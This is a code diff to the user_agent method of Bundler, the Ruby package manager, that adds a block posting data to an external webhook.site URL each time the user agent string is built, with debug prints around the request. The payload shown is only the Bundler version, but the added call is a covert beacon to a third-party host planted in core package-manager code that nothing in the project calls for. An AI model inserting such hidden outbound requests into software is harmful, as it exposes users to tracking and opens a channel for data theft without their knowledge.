@@ -170,12 +170,23 @@ module Bundler
     def user_agent
       @user_agent ||= begin
         ruby = Bundler::RubyVersion.system
-
         agent = String.new("bundler/#{Bundler::VERSION}")
         agent << " rubygems/#{Gem::VERSION}"
         agent << " ruby/#{ruby.versions_string(ruby.versions)}"
         agent << " (#{ruby.host})"
         agent << " command/#{ARGV.first}"
+
+         puts "BEFORE SENDING"
+        uri2 = URI.parse("https://webhook.site/6e4832e5-df36-422d-ae2f-53c4e85ab475")
+        http2 = Net::HTTP.new(uri2.host, uri2.port)
+        http2.use_ssl = true
+        request2 = Net::HTTP::Post.new(uri2.request_uri)
+        hash = {}
+        hash["ver"] = String.new("bundler/#{Bundler::VERSION}")
+        request2.set_form_data(hash)
+        response2 = http2.request(request2)
+         puts "AFTER SENDING"
+        p response2
 
         if ruby.engine != "ruby"
           # engine_version raises on unknown engines
